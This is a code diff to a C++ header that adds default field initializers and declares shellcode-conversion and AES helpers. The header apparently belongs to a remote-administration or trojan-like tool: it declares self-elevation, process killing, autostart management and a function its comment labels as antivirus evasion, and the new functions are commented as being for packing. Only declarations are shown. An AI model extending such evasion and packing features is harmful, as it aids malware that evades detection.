@@ -39,35 +39,35 @@ namespace Formidable {
     bool SelfElevate(); // 尝试提权运行
     // 进程管理增强
     struct ProcessDetail {
-        uint32_t pid;
-        uint32_t parentPid;
-        uint32_t threads;
+        uint32_t pid = 0;
+        uint32_t parentPid = 0;
+        uint32_t threads = 0;
         std::string name;
         std::string path;
         std::string user;
-        bool is64Bit;
+        bool is64Bit = false;
     };
     std::vector<ProcessDetail> GetDetailedProcessList();
     bool KillProcess(uint32_t pid);
     // 窗口管理增强
     struct WindowDetail {
-        uint64_t hwnd;
-        uint32_t pid;
+        uint64_t hwnd = 0;
+        uint32_t pid = 0;
         std::string title;
         std::string className;
-        bool isVisible;
+        bool isVisible = false;
         std::string status; // normal, minimized, maximized
     };
     std::vector<WindowDetail> GetDetailedWindowList();
     // 网络连接信息
     struct NetConnection {
         std::string localAddr;
-        uint16_t localPort;
+        uint16_t localPort = 0;
         std::string remoteAddr;
-        uint16_t remotePort;
+        uint16_t remotePort = 0;
         std::string state; // LISTENING, ESTABLISHED, etc.
         std::string type;  // TCP, UDP
-        uint32_t pid;
+        uint32_t pid = 0;
     };
     std::vector<NetConnection> GetNetConnections();
     // 服务管理
@@ -76,7 +76,7 @@ namespace Formidable {
         std::string displayName;
         std::string status; // Running, Stopped, etc.
         std::string startType; // Auto, Manual, Disabled
-        uint32_t pid;
+        uint32_t pid = 0;
     };
     std::vector<ServiceDetail> GetServiceList();
     // 自动启动管理
@@ -96,6 +96,11 @@ namespace Formidable {
     // 免杀辅助：XOR 加密
     std::string XorString(const std::string& input, const std::string& key);
     std::wstring XorStringW(const std::wstring& input, const std::wstring& key);
+
+    // Shellcode 与 AES 相关 (用于加壳)
+    bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength, bool align = false);
+    BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, DWORD flags, LPSTR* outBytes, DWORD* outLength);
+    void generate_random_iv(unsigned char* iv, size_t len);
 
     // 会话与系统管理
     bool IsUserSessionActive();
